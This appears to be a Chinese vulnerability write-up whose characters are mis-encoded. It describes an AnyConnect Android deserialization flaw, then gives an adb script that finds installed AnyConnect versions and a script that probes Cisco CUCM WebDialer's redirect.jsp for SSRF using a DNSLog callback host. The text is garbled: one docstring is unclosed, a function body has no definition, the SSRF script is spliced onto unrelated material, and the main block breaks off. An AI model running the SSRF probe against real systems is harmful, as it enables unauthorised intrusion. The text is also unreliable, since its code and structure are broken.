1.1 жјҸжҙһиғҢжҷҜ

  • AnyConnect Android е®ўжҲ·з«Ҝ 4.1.x < 4.1.00010

AnyConnect Android е®ўжҲ·з«Ҝзҡ„ ServiceController з»„д»¶йҖҡиҝҮ Android Intent жңәеҲ¶жҺҘж”¶еӨ–йғЁж•°жҚ®гҖӮеҪ“еә”з”Ёд»Һ Intent зҡ„ Extras дёӯиҺ·еҸ–еәҸеҲ—еҢ–еҜ№иұЎе№¶и°ғз”Ё ObjectInputStream.readObject() ж—¶пјҢи§ҰеҸ‘еҸҚеәҸеҲ—еҢ–жөҒзЁӢгҖӮ

#!/usr/bin/env python3
"""
жү«жҸҸжң¬ең°зҪ‘з»ңдёӯеҸҜиғҪиҝҗиЎҢ AnyConnect зҡ„ Android и®ҫеӨҮ

import subprocess
import sys

def scan_android_devices():
    """еҲ—еҮәе·ІиҝһжҺҘзҡ„ Android и®ҫеӨҮ"""
    result = subprocess.run(
        ["adb", "devices"],
        capture_output=True, text=True
    )
    devices = []
    for line in result.stdout.split("\n")[1:]:
        if line.strip() and "device" in line:
            serial = line.split()[0]
            devices.append(serial)
    return devices

def check_anyconnect_installed(device):
    """жЈҖжҹҘи®ҫеӨҮдёҠжҳҜеҗҰе®үиЈ…дәҶ AnyConnect"""
    cmd = f"adb -s {device} shell pm list packages | grep -i anyconnect"
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    if "com.cisco.anyconnect" in result.stdout:
        print(f"[FOUND] Device {device} has AnyConnect installed")
        # иҺ·еҸ–зүҲжң¬
        ver_cmd = f"adb -s {device} shell pm dump com.cisco.anyconnect.vpn.android.avf | grep versionName"
        ver_result = subprocess.run(ver_cmd, shell=True, capture_output=True, text=True)
        print(f"       Version info: {ver_result.stdout.strip()}")
        return True
    return False

    devices = scan_android_devices()
    if not devices:
        print("[-] No Android devices connected")
        sys.exit(1)
    
    for device in devices:
        check_anyconnect_installed(device)

"""

"""
import sys
import requests
import urllib3
import time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def check_ssrf(host, dnslog_domain, timeout=15):
    """жЈҖжөӢ WebDialer SSRF жјҸжҙһ"""
    payload_url = f"http://{dnslog_domain}/cucm-ssrf-test-{int(time.time())}"
    
    ssrf_payload = (
        f"/webdialer/redirect.jsp?url={urllib3.util.parse_url(payload_url).url}"
    )
    target = f"https://{host}:8443{ssrf_payload}"
    
    print(f"[*] еҸ‘йҖҒ SSRF иҜ·жұӮеҲ°: {target}")
    try:
        resp = requests.get(
            target,
            timeout=timeout,
            verify=False,
            headers={"User-Agent": "Mozilla/5.0"}
        )
        print(f"[*] е“Қеә”зҠ¶жҖҒз Ғ: {resp.status_code}")
        print(f"[*] е“Қеә”й•ҝеәҰ: {len(resp.text)} bytes")
        
        # жЈҖжҹҘе“Қеә”дёӯжҳҜеҗҰеҢ…еҗ« SSRF жҲҗеҠҹиҝ№иұЎ
        if resp.status_code == 200 and len(resp.text) > 0:
            print(f"[?] еҸҜиғҪеҸҜеҲ©з”ЁпјҢиҜ·жЈҖжҹҘ DNSLog жҳҜеҗҰж”¶еҲ°еӣһиҝһ")
        return resp.status_code
    except requests.exceptions.Timeout:
        print("[!] иҜ·жұӮи¶…ж—¶пјҢSSRF еҸҜиғҪе·Іи§ҰеҸ‘пјҲзӣІжү“еңәжҷҜпјү")
        return "timeout"
    except Exception as e:
        print(f"[!] й”ҷиҜҜ: {e}")
        return None

def check_webdialer_enabled(host):
    """жЈҖжҹҘ WebDialer жңҚеҠЎжҳҜеҗҰеҗҜз”Ё"""
    target = f"https://{host}:8443/webdialer/"
    try:
        resp = requests.get(target, timeout=10, verify=False)
        if resp.status_code not in [404, 403]:
            print(f"[+] WebDialer жңҚеҠЎе·ІеҗҜз”Ё (HTTP {resp.status_code})")
            return True
        else:
            print(f"[-] WebDialer еҸҜиғҪжңӘеҗҜз”Ё (HTTP {resp.status_code})")
            return False
    except Exception as e:
        print(f"[!] иҝһжҺҘеӨұиҙҘ: {e}")
        return False

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"з”Ёжі•: {sys.argv[0]} <target_host> <dnslog_domain>")
        sys.exit(1)
    
    host = sys.argv[1]
    dnslog_domain = sys.argv[2]
